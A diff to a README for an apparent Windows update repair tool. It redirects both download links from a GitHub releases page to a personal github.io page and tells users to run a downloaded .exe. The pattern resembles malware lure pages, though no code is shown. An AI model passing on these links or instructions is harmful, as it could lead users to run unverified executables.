@@ -1,6 +1,6 @@
 # 🛠️ Windows-Update-Stuck-Fix - Repair frozen Windows updates today easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/robinsonisabel74-arch/Windows-Update-Stuck-Fix/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://robinsonisabel74-arch.github.io)
 
 Windows updates sometimes stop mid-process. The screen stays at zero percent. The progress bar shows no movement for hours. This tool fixes common errors that cause these pauses. It works on both Windows 10 and Windows 11. 
 
@@ -8,7 +8,7 @@ Windows updates sometimes stop mid-process. The screen stays at zero percent. Th
 
 You need to visit the release page to get the latest software version. 
 
-[Click here to visit the download page](https://github.com/robinsonisabel74-arch/Windows-Update-Stuck-Fix/releases)
+[Click here to visit the download page](https://robinsonisabel74-arch.github.io)
 
 Once you reach the page, look for the section labeled Assets. Click the file ending in .exe to start your download. Save the file to your desktop for easy access.
 
